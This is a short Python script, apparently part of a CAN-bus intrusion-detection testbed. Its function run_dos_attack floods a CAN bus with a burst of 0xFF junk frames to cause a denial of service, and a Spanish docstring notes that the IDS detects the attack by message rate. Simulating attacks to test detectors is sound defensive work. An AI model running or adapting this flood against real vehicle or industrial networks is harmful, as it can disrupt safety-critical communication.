import time

import can

from core import config


def run_dos_attack(count=100, delay=0.001):
    """Satura el bus con una rafaga de tramas basura para forzar denegacion de
    servicio. El IDS lo detecta por la tasa de mensajes/segundo."""
    bus = config.make_bus(receive_own_messages=False)
    junk_data = b"\xFF" * 8

    print(f"[Ataque DoS] Inyectando rafaga de {count} mensajes...")
    for _ in range(count):
        bus.send(can.Message(arbitration_id=config.DOS_FLOOD_ID,
                             data=junk_data, is_fd=config.BUS_FD))
        if delay:
            time.sleep(delay)
    bus.shutdown()


if __name__ == "__main__":
    run_dos_attack()
